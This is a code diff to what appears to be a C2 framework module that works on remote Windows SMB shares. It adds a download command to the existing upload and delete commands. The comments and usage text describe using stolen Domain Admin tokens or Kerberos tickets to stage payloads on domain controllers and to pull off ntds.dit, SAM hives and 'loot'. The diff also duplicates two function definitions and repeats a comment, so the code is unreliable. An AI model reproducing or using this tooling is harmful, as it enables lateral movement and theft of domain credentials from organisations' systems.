@@ -1,10 +1,11 @@
-# cifs_upload.star — push a file to / remove a file from a remote Windows
-# share (CIFS/SMB) under the module's token/ticket context.
+# cifs.star — push a file to / pull a file from / remove a file from a
+# remote Windows share (CIFS/SMB) under the module's token/ticket context.
 #
-# Two commands are provided (the CC module config injects a literal argv[0]):
+# Three commands are provided (the CC module config injects a literal argv[0]):
 #
-#   cifs_upload  →  upload   (src, dest)
-#   cifs_rm      →  delete   (dest, rmdir=false)
+#   cifs_upload    →  upload   (src, dest)
+#   cifs_download  →  download (src, dest)
+#   cifs_rm        →  delete   (dest, rmdir=false)
 #
 # Use case: this agent runs on a domain-joined host where a Domain Admin is
 # logged in (or where a DA token / Kerberos ticket is available in an
@@ -13,8 +14,9 @@
 # module stages a payload (agent, tool, script) onto the target directly
 # over CIFS — or removes files from it — using only Win32 file I/O:
 #
-#     upload:  CreateFileW("\\DC01\ADMIN$\Temp\stage.exe") → WriteFile(...) → CloseHandle
-#     delete:  DeleteFileW / RemoveDirectoryW("\\DC01\ADMIN$\Temp\stage.exe")
+#     upload:    CreateFileW("\\DC01\ADMIN$\Temp\stage.exe") → WriteFile(...) → CloseHandle
+#     download:  CreateFileW("\\DC01\ADMIN$\Temp\ntds.dit") → ReadFile(...) → write_bytes
+#     delete:    DeleteFileW / RemoveDirectoryW("\\DC01\ADMIN$\Temp\stage.exe")
 #
 # Token / ticket handling is performed by the module framework before the
 # script starts (agent-side resolveTokenKey), the script itself needs none:
@@ -27,6 +29,11 @@
 #
 #     cifs_upload --user CORP.LOCAL/da --ticket <base64 KRB-CRED .kirbi> \
 #                 --src mem:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe
+#
+# …and to clean up afterwards:
+#
+#     cifs_download --src \\DC01\ADMIN$\Temp\loot.zip \\
+#                   --dest mem:///loot.zip --token S-1-5-21-...-1104
 #
 # …and to clean up afterwards:
 #
@@ -51,6 +58,7 @@
 # netonly make_token session.
 
 GENERIC_WRITE        = 0x40000000
+GENERIC_READ         = 0x80000000
 FILE_SHARE_READ      = 0x00000001
 FILE_SHARE_WRITE     = 0x00000002
 CREATE_ALWAYS        = 2
@@ -232,6 +240,9 @@ def effective_identity():
 #   http(s)://…  – http_get
 #   mem:///…     – encrypted memfs (read_file; staged via CC 'put --dst mem:///…')
 #   C:\…         – local file on this agent
+#
+# (downloads have no source-side plumbing: bytes stream straight from the
+# remote handle via ReadFile + win_read_mem into write_bytes)
 def load_payload(src):
     low = src.lower()
     if low.startswith("http://") or low.startswith("https://"):
@@ -265,15 +276,32 @@ def ensure_remote_dirs(server, share, dirs):
     return True, ""
 
 
-# open_dest opens (creating/overwriting) the remote file for writing.
-def open_dest(unc_path, mode):
+# open_remote opens a remote file with the given access rights (upload uses
+# GENERIC_WRITE + CREATE_ALWAYS, download GENERIC_READ + OPEN_EXISTING).
+# Returns (handle, error).
+def open_remote(unc_path, access):
+    creation = OPEN_EXISTING
+    if access == GENERIC_WRITE:
+        creation = CREATE_ALWAYS
     res = win_call("kernel32.dll", "CreateFileW", unc_path,
-                   GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
-                   0, mode, FILE_ATTRIBUTE_NORMAL, 0)
+                   access, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                   0, creation, FILE_ATTRIBUTE_NORMAL, 0)
     h = res["r1"]
     if is_invalid_handle(h):
         return 0, "CreateFileW %s: %s" % (unc_path, fmt_winerr(res))
     return h, ""
+
+
+# remote_size reads the size of an open file handle via GetFileSizeEx.
+# Returns (size, error).
+def remote_size(h):
+    size_ptr = win_alloc(8)
+    res = win_call("kernel32.dll", "GetFileSizeEx", h, size_ptr)
+    size = read_u64(size_ptr, 0)
+    win_free(size_ptr)
+    if res["r1"] == 0:
+        return 0, "GetFileSizeEx: %s" % fmt_winerr(res)
+    return size, ""
 
 
 # stream_write writes `data` to the open remote handle in chunked WriteFile
@@ -317,12 +345,9 @@ def stream_write(h, data, chunk):
 
 # verify_remote re-opens the destination read-only and confirms its size.
 def verify_remote(unc_path, expected):
-    res = win_call("kernel32.dll", "CreateFileW", unc_path,
-                   0, FILE_SHARE_READ | FILE_SHARE_WRITE,
-                   0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
-    h = res["r1"]
-    if is_invalid_handle(h):
-        return False, "re-open %s: %s" % (unc_path, fmt_winerr(res))
+    h, err = open_remote(unc_path, 0)
+    if h == 0:
+        return False, err
     size_ptr = win_alloc(8)
     res = win_call("kernel32.dll", "GetFileSizeEx", h, size_ptr)
     actual = read_u64(size_ptr, 0)
@@ -333,6 +358,110 @@ def verify_remote(unc_path, expected):
     if actual != expected:
         return False, "size mismatch: remote has %d bytes, expected %d" % (actual, expected)
     return True, ""
+
+
+# open_remote opens a remote file with the given access rights (upload uses
+# GENERIC_WRITE + CREATE_ALWAYS, download GENERIC_READ + OPEN_EXISTING).
+def open_remote(unc_path, access):
+    creation = OPEN_EXISTING
+    if access == GENERIC_WRITE:
+        creation = CREATE_ALWAYS
+    res = win_call("kernel32.dll", "CreateFileW", unc_path,
+                   access, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                   0, creation, FILE_ATTRIBUTE_NORMAL, 0)
+    h = res["r1"]
+    if is_invalid_handle(h):
+        return 0, "CreateFileW %s: %s" % (unc_path, fmt_winerr(res))
+    return h, ""
+
+
+# remote_size reads the size of an open file handle via GetFileSizeEx.
+def remote_size(h):
+    size_ptr = win_alloc(8)
+    res = win_call("kernel32.dll", "GetFileSizeEx", h, size_ptr)
+    size = read_u64(size_ptr, 0)
+    win_free(size_ptr)
+    if res["r1"] == 0:
+        return 0, "GetFileSizeEx: %s" % fmt_winerr(res)
+    return size, ""
+
+
+# stream_read reads the whole open remote handle in chunked ReadFile calls,
+# mirroring the upload path's chunked WriteFile loop. Each chunk is pulled
+# out of unmanaged memory with win_read_mem and converted to a base64 string
+# via bytes_to_b64 (byte-exact, UTF-8-safe); the accumulated base64 chunks
+# are decoded once by b64_to_bytes at the end. Returns (bytes, error).
+def stream_read(h, total, chunk):
+    # Separate allocations: read buffer (chunk-sized) and the ReadFile
+    # bytes-read DWORD. Never alias them, and never read into a smaller
+    # allocation — ReadFile faults (ERROR_NOACCESS 998) past the buffer.
+    buf_ptr = win_alloc(chunk)
+    if buf_ptr == 0:
+        return None, "failed to allocate %d-byte ReadFile buffer" % chunk
+    read_ptr = win_alloc(4)
+    if read_ptr == 0:
+        win_free(buf_ptr)
+        return None, "failed to allocate ReadFile bytes-read buffer"
+
+    parts = []
+    got = 0
+    last_tick = -1
+    while got < total:
+        n = chunk
+        if total - got < n:
+            n = total - got
+        res = win_call("kernel32.dll", "ReadFile", h, buf_ptr, n, read_ptr, 0)
+        if res["r1"] == 0:
+            win_free(read_ptr)
+            win_free(buf_ptr)
+            return None, "ReadFile at offset %d: %s" % (got, fmt_winerr(res))
+        r = read_uint32(read_ptr, 0)
+        if r == 0:
+            win_free(read_ptr)
+            win_free(buf_ptr)
+            return None, "ReadFile returned EOF at offset %d (file shrunk? locked?)" % got
+        parts.append(bytes_to_b64(win_read_mem(buf_ptr, r)))
+        got += r
+        pct = (got * 100) // total
+        if pct // 10 != last_tick:
+            last_tick = pct // 10
+            print("[*] Downloaded %d/%d bytes (%d%%)" % (got, total, pct))
+
+    win_free(read_ptr)
+    win_free(buf_ptr)
+    # base64 chunks are individually padded — pass the list as-is and let
+    # b64_to_bytes decode each element before concatenating.
+    return b64_to_bytes(parts), ""
+
+
+# save_download writes the downloaded bytes to dest via the agent's
+# binary-safe writer. Supports mem:/// (encrypted memfs — retrievable with
+# CC 'get') and local disk paths. Returns (bytes_written, error).
+def save_download(dest, data):
+    if not (dest.startswith("mem://") or str_contains(dest, ":\\") or str_contains(dest, ":/")):
+        msg = "dest must be a mem:/// path or a local path like C:\\loot.zip (not a UNC path)"
+        print("[-] %s" % msg)
+        return 0, msg
+    written = write_bytes(dest, data)
+    if written != len(data):
+        return written, "short write: wrote %d of %d bytes to %s" % (written, len(data), dest)
+    return written, ""
+
+
+# verify_download re-opens the remote file read-only and streams it again,
+# hashing both transfers; a mismatch means the file changed mid-download or
+# the chunk pipeline is lossy. Returns ("", error) on success.
+def verify_download(src, first_data, size, chunk):
+    h, err = open_remote(src, GENERIC_READ)
+    if h == 0:
+        return "", err
+    data, err = stream_read(h, size, chunk)
+    win_call("kernel32.dll", "CloseHandle", h)
+    if err != "":
+        return "", err
+    if crypto_hash("sha256", data) != crypto_hash("sha256", first_data):
+        return "", "re-read of %s does not match the first download (file changed mid-transfer?)" % src
+    return "", ""
 
 
 # confirm_gone checks that dest can no longer be opened after a successful
@@ -397,12 +526,12 @@ def cmd_upload(args):
     if not ok:
         return "Fail: " + err
 
-    h, err = open_dest(dest, CREATE_ALWAYS)
+    h, err = open_remote(dest, GENERIC_WRITE)
     if h == 0:
         # One retry: some targets need a moment / the dir chain was just made.
         ok, err2 = ensure_remote_dirs(unc["server"], unc["share"], unc["dirs"])
         if ok:
-            h, err = open_dest(dest, CREATE_ALWAYS)
+            h, err = open_remote(dest, GENERIC_WRITE)
         if h == 0:
             return "Fail: " + err
 
@@ -425,6 +554,79 @@ def cmd_upload(args):
 
     print("[+] Upload complete: %d bytes -> %s" % (total, dest))
     return "OK: uploaded %d bytes to %s as %s" % (total, dest, who if who != "" else "the assigned token context")
+
+
+# ── command: download ─────────────────────────────────────────────────────
+
+def cmd_download(args):
+    src = strip_quotes(args[0]) if len(args) > 0 else ""
+    dest = strip_quotes(args[1]) if len(args) > 1 else ""
+    chunk_kb_raw = args[2] if len(args) > 2 else "1024"
+    do_verify = to_bool(args[3]) if len(args) > 3 else False
+
+    if src == "" or dest == "":
+        usage()
+        return "Fail: both src and dest are required"
+
+    chunk_kb = 1024
+    kb = parse_positive_int(chunk_kb_raw)
+    if kb == None:
+        print("[!] invalid chunk_kb '%s', using 1024" % str(chunk_kb_raw))
+    else:
+        chunk_kb = kb
+    if chunk_kb < 1:
+        chunk_kb = 1024
+    chunk = chunk_kb * 1024
+
+    unc = parse_unc(src)
+    if unc == None:
+        usage()
+        return "Fail: src must be a full UNC path under an existing share, e.g. \\\\DC01\\C$\\Windows\\system32\\config\\SAM"
+
+    # Reject a UNC dest before any network I/O: downloads land on this agent.
+    if dest.startswith("\\\\"):
+        usage()
+        return "Fail: dest must be a mem:/// path or a local path (e.g. mem:///loot.zip or C:\\loot.zip) — not another UNC share"
+
+    print("[*] cifs_download: %s  ->  %s" % (src, dest))
+    who = effective_identity()
+    if who != "":
+        print("[*] Effective identity: %s" % who)
+    else:
+        print("[!] Could not resolve the effective token identity")
+
+    h, err = open_remote(src, GENERIC_READ)
+    if h == 0:
+        return "Fail: " + err
+
+    size, err = remote_size(h)
+    if err != "":
+        win_call("kernel32.dll", "CloseHandle", h)
+        return "Fail: " + err
+    if size == 0:
+        win_call("kernel32.dll", "CloseHandle", h)
+        return "Fail: %s is empty (0 bytes) — wrong path, or the file is locked/zero-length" % src
+    print("[*] Remote file size: %d bytes" % size)
+
+    data, err = stream_read(h, size, chunk)
+    win_call("kernel32.dll", "CloseHandle", h)
+    if err != "":
+        print("[-] Download interrupted — partial transfer discarded, nothing was saved")
+        return "Fail: " + err
+
+    written, err = save_download(dest, data)
+    if err != "":
+        return "Fail: " + err
+
+    if do_verify:
+        _, verr = verify_download(src, data, size, chunk)
+        if verr != "":
+            return "Fail: download finished but verify failed: " + verr
+        print("[+] Verified: re-read of %s matches (%d bytes)" % (src, size))
+
+    print("[+] Download complete: %d bytes -> %s" % (written, dest))
+    return "OK: downloaded %d bytes from %s to %s as %s" % (
+        written, src, dest, who if who != "" else "the assigned token context")
 
 
 # ── command: delete ─────────────────────────────────────────────────────────
@@ -480,18 +682,22 @@ def cmd_delete(args):
 
 
 def usage():
-    print("[*] cifs_upload / cifs_rm: work with files on a remote SMB/CIFS")
-    print("    share as the module's token/ticket identity (no agent needed")
+    print("[*] cifs_upload / cifs_download / cifs_rm: work with files on a remote")
+    print("    SMB/CIFS share as the module's token/ticket identity (no agent needed")
     print("    on the target).")
     print("")
     print("  upload:")
     print("    cifs_upload --src <mem:///file|C:\\path|http(s)://url> \\")
     print("                --dest \\\\SERVER\\SHARE\\dir\\file  (e.g. \\\\DC01\\ADMIN$\\Temp\\stage.exe)")
     print("                [--chunk_kb 1024] [--delete_src true] [--verify true]")
+    print("  download:")
+    print("    cifs_download --src \\\\SERVER\\SHARE\\dir\\file  (e.g. \\\\DC01\\C$\\Windows\\system32\\config\\SAM)")
+    print("                  --dest <mem:///file|C:\\path>  (mem:///loot.zip retrieves it with CC 'get')")
+    print("                  [--chunk_kb 1024] [--verify true]")
     print("  delete:")
     print("    cifs_rm --dest \\\\SERVER\\SHARE\\dir\\file")
     print("            [--rmdir true]   # dest is an (empty) directory instead of a file")
-    print("  identity (either):")
+    print("  identity (any):")
     print("    --token <SID|session>   # stolen DA token / make_token session")
     print("    --user DOMAIN/user      # or create a make_token session…")
     print("    --ticket <b64 kirbi>    # …and import a Kerberos ticket into it")
@@ -503,6 +709,8 @@ def main(*args):
         return cmd_delete(args[1:])
     if cmd in ("upload", "put", "add"):
         return cmd_upload(args[1:])
+    if cmd in ("download", "dl", "get", "fetch"):
+        return cmd_download(args[1:])
     if cmd in ("help", "-h", "--help"):
         usage()
         return "OK"
